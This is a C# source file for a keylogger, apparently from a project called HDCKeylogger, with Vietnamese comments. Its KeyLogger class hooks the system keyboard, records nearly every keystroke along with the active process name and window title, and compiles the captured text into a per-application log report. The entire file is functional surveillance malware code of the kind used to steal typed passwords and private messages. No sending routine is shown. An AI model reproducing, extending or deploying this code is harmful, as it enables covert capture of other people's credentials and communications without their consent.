using HDCKeylogger.WinAPI;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Windows.Forms;

namespace HDCKeylogger.Keylog
{
    public class KeyLogger
    {
        #region Private vars
        // Danh sách tên ứng dụng
        private Stack _appNames;
        #endregion

        #region Public properties
        // Kích hoạt
        public bool IsEnabled { get; private set; }
        // Hooker
        public UserActivityHook Hooker { get; set; }
        // Dữ liệu ghi lại
        public Hashtable LogData { get; private set; }
        // Giữ các phím đặc biệt
        public bool _isAltDown { get; private set; }
        public bool _isControlDown { get; private set; }
        public bool _isFsDown { get; private set; }
        public bool _isShiftDown { get; private set; }
        #endregion

        /// <summary>
        /// Phương thức khởi tạo
        /// </summary>
        public KeyLogger()
        {
            Hooker = new UserActivityHook();
            Hooker.KeyDown += HookerKeyDown;
            Hooker.KeyPress += HookerKeyPress;
            Hooker.KeyUp += HookerKeyUp;
            Hooker.Stop();

            _appNames = new Stack();
            LogData = new Hashtable();
        }

        #region Sự kiện bàn phím
        /// <summary>
        /// Nhấn phím xuống
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        public void HookerKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData.ToString() == "Return")
                Logger("[Enter]");
            if (e.KeyData.ToString() == "Escape")
                Logger("[Escape]");

            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    _isAltDown = true;
                    break;
                case "RControlKey":
                case "LControlKey":
                    _isControlDown = true;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    _isShiftDown = true;
                    break;
                case "F10":
                case "F11":
                case "F12":
                    _isFsDown = true;
                    break;
            }
        }

        /// <summary>
        /// Nhấn phím
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        public void HookerKeyPress(object sender, KeyPressEventArgs e)
        {
            if ((byte)e.KeyChar == 9)
                Logger("[TAB]");
            else if (Char.IsLetterOrDigit(e.KeyChar) || Char.IsPunctuation(e.KeyChar))
                Logger(e.KeyChar.ToString());
            else if (e.KeyChar == 32)
                Logger(" ");
            else if (e.KeyChar != 27 && e.KeyChar != 13) //Escape
                Logger("[Char\\" + ((byte)e.KeyChar) + "]");
        }

        /// <summary>
        /// Thả phím ra
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        public void HookerKeyUp(object sender, KeyEventArgs e)
        {
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    _isAltDown = false;
                    break;
                case "RControlKey":
                case "LControlKey":
                    _isControlDown = false;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    _isShiftDown = false;
                    break;
                case "F10":
                case "F11":
                case "F12":
                    _isFsDown = false;
                    break;
            }
        }
        #endregion

        /// <summary>
        /// Kích hoạt
        /// </summary>
        public void Enable()
        {
            Hooker.Start();
            IsEnabled = true;
        }

        /// <summary>
        /// Ngừng kích hoạt
        /// </summary>
        public void Disable()
        {
            Hooker.Stop();
            IsEnabled = false;
        }

        /// <summary>
        /// Ghi dữ liệu lại
        /// </summary>
        /// <param name="txt"></param>
        private void Logger(string txt)
        {
            try
            {
                Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
                string _appName = p.ProcessName;
                string _appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", "");
                string _thisapplication = _appltitle + "######" + _appName;
                if (!_appNames.Contains(_thisapplication))
                {
                    _appNames.Push(_thisapplication);
                    LogData.Add(_thisapplication, "");
                }
                IDictionaryEnumerator en = LogData.GetEnumerator();
                while (en.MoveNext())
                {
                    if (en.Key.ToString() == _thisapplication)
                    {
                        string prlogdata = en.Value.ToString();
                        LogData.Remove(_thisapplication);
                        LogData.Add(_thisapplication, prlogdata + " " + txt);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                throw;
            }
        }

        /// <summary>
        /// Tạo text log
        /// </summary>
        /// <returns></returns>
        public string Generatelog()
        {
            try
            {
                string Logdata = "CS Key logger Log Data" + Environment.NewLine;

                IDictionaryEnumerator element = LogData.GetEnumerator();
                while (element.MoveNext())
                {
                    string processname =
                        element.Key.ToString().Trim().Substring(0, element.Key.ToString().Trim().LastIndexOf("######")).
                            Trim();
                    string applname =
                        element.Key.ToString().Trim().Substring(element.Key.ToString().Trim().LastIndexOf("######") + 6)
                            .Trim();
                    string ldata = element.Value.ToString().Trim();

                    if (applname.Length < 25 && processname.Length < 25)
                    {
                        Logdata += applname.PadRight(25, '-');
                        Logdata += processname.PadLeft(25, '-');
                        Logdata += Environment.NewLine + "Log Data :" + Environment.NewLine;
                        Logdata += ldata + Environment.NewLine + Environment.NewLine;
                    }
                }
                Logdata += Environment.NewLine + Environment.NewLine + Environment.NewLine +
                           String.Format("LOG FILE, Data {0}", DateTime.Now.ToString());
                return Logdata;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
            return null;
        }
    }
}
